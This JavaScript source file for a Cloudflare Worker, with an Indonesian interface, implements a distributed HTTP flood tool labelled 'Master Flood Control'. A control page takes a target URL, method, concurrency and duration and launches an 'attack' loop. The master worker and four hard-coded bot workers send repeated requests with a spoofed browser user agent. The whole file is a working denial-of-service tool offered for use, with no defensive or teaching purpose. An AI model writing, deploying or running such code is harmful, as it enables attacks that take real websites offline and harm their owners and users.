/**
 * HTTP Flood Control v9
 * Master andal + 4 bot bonus aktif lagi
 */

const EXTRA_BOTS = [
  'https://http-flood-control-1.aminaputra6.workers.dev',
  'https://http-flood-control-2.aminaputra6.workers.dev',
  'https://http-flood-control-3.aminaputra6.workers.dev',
  'https://http-flood-control-4.aminaputra6.workers.dev'
];

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
};

const MASTER_HTML = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Master Flood Control</title>
<style>
:root{--bg:#e8f4fc;--card:#fff;--border:#bae6fd;--accent:#0ea5e9;--accent2:#0284c7;--text:#0f172a;--muted:#64748b;--ok:#10b981;--err:#ef4444;--warn:#f59e0b;--livebg:#f0f9ff}
*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:14px;display:flex;justify-content:center}
.wrap{width:100%;max-width:640px}.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px;box-shadow:0 8px 24px rgba(14,165,233,.1)}
h1{font-size:1.25rem;color:var(--accent2);margin-bottom:3px}.sub{color:var(--muted);font-size:.82rem;margin-bottom:12px}
label{display:block;font-size:.68rem;font-weight:600;color:var(--muted);margin-bottom:3px;text-transform:uppercase}
input,select{width:100%;background:#f8fafc;border:1px solid var(--border);border-radius:8px;padding:10px;color:var(--text);font-size:.88rem;margin-bottom:10px}
input:focus,select:focus{outline:none;border-color:var(--accent)}
.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px}
.btns{display:flex;gap:7px;margin:2px 0 10px}button{flex:1;padding:11px;border:none;border-radius:8px;font-size:.88rem;font-weight:600;cursor:pointer}
#btnStart{background:var(--accent);color:#fff}#btnStart:disabled{opacity:.45}#btnStop{background:transparent;border:1px solid var(--err);color:var(--err)}#btnStop:disabled{opacity:.35}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:8px}
.stat{background:var(--livebg);border:1px solid var(--border);border-radius:8px;padding:8px 3px;text-align:center}
.stat b{display:block;font-size:1.05rem;color:var(--accent2)}.stat span{font-size:.6rem;color:var(--muted);text-transform:uppercase}
.live{background:#0c4a6e;border-radius:9px;padding:7px 9px;height:90px;overflow:hidden;font-family:monospace;font-size:.68rem;color:#7dd3fc;margin-bottom:8px;line-height:1.35}
.live .t{color:#38bdf8;font-size:.62rem;font-weight:600;margin-bottom:2px}
.live-feed{height:65px;overflow:hidden}.live-feed div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.lok{color:#4ade80}.lerr{color:#f87171}
.log{background:#f8fafc;border:1px solid var(--border);border-radius:8px;height:150px;overflow-y:auto;padding:8px;font-family:monospace;font-size:.7rem;line-height:1.35}
.log div{margin-bottom:1px}.ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}
.status{display:flex;align-items:center;gap:6px;margin-top:8px;font-size:.78rem;color:var(--muted)}
.dot{width:7px;height:7px;border-radius:50%;background:var(--muted)}.dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok);animation:p 1s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
@media(max-width:500px){.grid3{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
</style>
</head>
<body>
<div class="wrap"><div class="card">
<h1>Master Flood Control</h1>
<p class="sub">Master + 4 bot bonus. Semua aktif.</p>

<label>Target URL</label>
<input type="url" id="target" placeholder="https://target.com">

<div class="grid3">
<div><label>Method</label><select id="method"><option>GET</option><option>POST</option><option selected>HEAD</option></select></div>
<div><label>Concurrency</label><input type="number" id="conc" value="12" min="1" max="25"></div>
<div><label>Durasi (detik)</label><input type="number" id="dur" value="15" min="3" max="60"></div>
</div>

<div class="btns">
<button id="btnStart">Mulai Serangan</button>
<button id="btnStop" disabled>Stop</button>
</div>

<div class="live"><div class="t">LIVE FEED</div><div class="live-feed" id="live"></div></div>

<div class="stats">
<div class="stat"><b id="sSent">0</b><span>Terkirim</span></div>
<div class="stat"><b id="sOk">0</b><span>Sukses</span></div>
<div class="stat"><b id="sFail">0</b><span>Gagal</span></div>
<div class="stat"><b id="sRps">0</b><span>RPS</span></div>
</div>

<div class="log" id="log"></div>
<div class="status"><div class="dot" id="dot"></div><span id="stxt">Siap</span></div>
</div></div>

<script>
const EXTRA = ["https://http-flood-control-1.aminaputra6.workers.dev","https://http-flood-control-2.aminaputra6.workers.dev","https://http-flood-control-3.aminaputra6.workers.dev","https://http-flood-control-4.aminaputra6.workers.dev"];
const $ = id => document.getElementById(id);
let running = false;
let liveN = 0;

function log(m, c='info') {
  const d = document.createElement('div');
  d.className = c;
  d.textContent = '[' + new Date().toLocaleTimeString('id-ID',{hour12:false}) + '] ' + m;
  $('log').appendChild(d);
  if ($('log').children.length > 40) $('log').removeChild($('log').firstChild);
  $('log').scrollTop = $('log').scrollHeight;
}
function live(m, c='lok') {
  const d = document.createElement('div');
  d.className = c;
  d.textContent = m;
  $('live').appendChild(d);
  liveN++;
  if (liveN > 6) { $('live').removeChild($('live').firstChild); liveN--; }
}
function status(on, t) {
  $('dot').classList.toggle('on', on);
  $('stxt').textContent = t;
}

async function oneAttack(target, method) {
  const r = await fetch('/attack', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: target, method: method })
  });
  return r.status;
}

async function botAttack(botUrl, target, method) {
  try {
    const r = await fetch(botUrl.replace(/\/$/,'') + '/attack', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: target, method: method })
    });
    return r.status;
  } catch {
    return 0;
  }
}

async function start() {
  log('Tombol ditekan...', 'warn');

  const target = $('target').value.trim();
  if (!target || !target.startsWith('http')) {
    log('URL target kosong atau tidak valid', 'err');
    return;
  }

  const method = $('method').value;
  let conc = parseInt($('conc').value) || 12;
  let dur = parseInt($('dur').value) || 15;
  conc = Math.max(1, Math.min(25, conc));
  dur = Math.max(3, Math.min(60, dur));

  running = true;
  $('btnStart').disabled = true;
  $('btnStop').disabled = false;
  $('log').innerHTML = '';
  $('live').innerHTML = '';
  liveN = 0;
  $('sSent').textContent = '0';
  $('sOk').textContent = '0';
  $('sFail').textContent = '0';
  $('sRps').textContent = '0';

  status(true, 'Berjalan...');
  log('Target: ' + target, 'info');
  log('Method: ' + method + ' | Conc: ' + conc + ' | Durasi: ' + dur + 's', 'info');
  live('>> START', 'lok');

  // Tes Master dulu
  log('Tes Master...', 'warn');
  try {
    const st = await oneAttack(target, method);
    log('Master OK, status: ' + st, 'ok');
    live('master test → ' + st, 'lok');
    $('sSent').textContent = '1';
    if (st >= 200 && st < 500) $('sOk').textContent = '1';
    else $('sFail').textContent = '1';
  } catch (e) {
    log('Master GAGAL: ' + e.message, 'err');
    live('master FAIL', 'lerr');
    running = false;
    $('btnStart').disabled = false;
    $('btnStop').disabled = true;
    status(false, 'Error');
    return;
  }

  const t0 = Date.now();
  const end = t0 + dur * 1000;
  let sent = 1, ok = parseInt($('sOk').textContent) || 0, fail = parseInt($('sFail').textContent) || 0;

  log('Loop serangan + 4 bot bonus...', 'info');

  while (running && Date.now() < end) {
    const promises = [];

    // Master
    for (let i = 0; i < conc; i++) {
      promises.push(
        oneAttack(target, method).then(st => {
          sent++;
          if (st >= 200 && st < 500) ok++; else fail++;
          $('sSent').textContent = sent;
          $('sOk').textContent = ok;
          $('sFail').textContent = fail;
          const el = (Date.now() - t0) / 1000;
          $('sRps').textContent = el > 0 ? Math.round(sent / el) : 0;
          if (sent % 4 === 0) live('master → ' + st + ' | ' + sent, (st >= 200 && st < 500) ? 'lok' : 'lerr');
        }).catch(() => {
          sent++; fail++;
          $('sSent').textContent = sent;
          $('sFail').textContent = fail;
        })
      );
    }

    // 4 bot bonus (fire & forget, tidak ganggu Master)
    EXTRA.forEach((bot, idx) => {
      promises.push(
        botAttack(bot, target, method).then(st => {
          if (st > 0) {
            sent++;
            if (st >= 200 && st < 500) ok++; else fail++;
            $('sSent').textContent = sent;
            $('sOk').textContent = ok;
            $('sFail').textContent = fail;
            if (sent % 5 === 0) live('bot' + (idx+1) + ' → ' + st + ' | ' + sent, (st >= 200 && st < 500) ? 'lok' : 'lerr');
          }
        }).catch(() => {})
      );
    });

    await Promise.all(promises);
  }

  running = false;
  $('btnStart').disabled = false;
  $('btnStop').disabled = true;
  status(false, 'Selesai');
  live('>> DONE', 'lok');
  log('Selesai. Terkirim: ' + sent + ' | Sukses: ' + ok + ' | Gagal: ' + fail, 'ok');
}

$('btnStart').onclick = () => {
  start().catch(e => {
    log('Error fatal: ' + e.message, 'err');
    running = false;
    $('btnStart').disabled = false;
    $('btnStop').disabled = true;
    status(false, 'Error');
  });
};

$('btnStop').onclick = () => {
  running = false;
  $('btnStart').disabled = false;
  $('btnStop').disabled = true;
  status(false, 'Dihentikan');
  live('>> STOP', 'lerr');
  log('Dihentikan manual', 'warn');
};

log('UI siap. Master + 4 bot bonus aktif.', 'info');
</script>
</body>
</html>`;

const BOT_HTML = `<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bot</title>
<style>body{font-family:system-ui;background:#e8f4fc;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}.c{background:#fff;border:1px solid #bae6fd;border-radius:14px;padding:28px;text-align:center}h1{color:#0284c7;font-size:1.2rem}p{color:#64748b;font-size:.9rem}</style></head>
<body><div class="c"><h1>Flood Bot Active</h1><p>Siap.</p></div></body></html>`;

export default {
  async fetch(request, env, ctx) {
    const u = new URL(request.url);

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    const mode = u.searchParams.get('mode') || 'bot';

    if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
      const html = mode === 'master' ? MASTER_HTML : BOT_HTML;
      return new Response(html, {
        headers: { ...corsHeaders, 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
      });
    }

    if (request.method === 'POST' && u.pathname === '/attack') {
      try {
        const body = await request.json();
        const target = (body.url || '').trim();
        const method = (body.method || 'GET').toUpperCase();

        if (!target.startsWith('http')) {
          return new Response('bad url', { status: 400, headers: corsHeaders });
        }

        const ctrl = new AbortController();
        const to = setTimeout(() => ctrl.abort(), 6000);

        const opts = {
          method,
          signal: ctrl.signal,
          redirect: 'follow',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Cache-Control': 'no-cache'
          }
        };
        if (method === 'POST') {
          opts.body = JSON.stringify({ t: Date.now() });
          opts.headers['Content-Type'] = 'application/json';
        }

        const res = await fetch(target, opts);
        clearTimeout(to);
        return new Response(null, { status: res.status, headers: corsHeaders });
      } catch (e) {
        return new Response(null, { status: 502, headers: corsHeaders });
      }
    }

    return new Response('Not Found', { status: 404, headers: corsHeaders });
  }
};
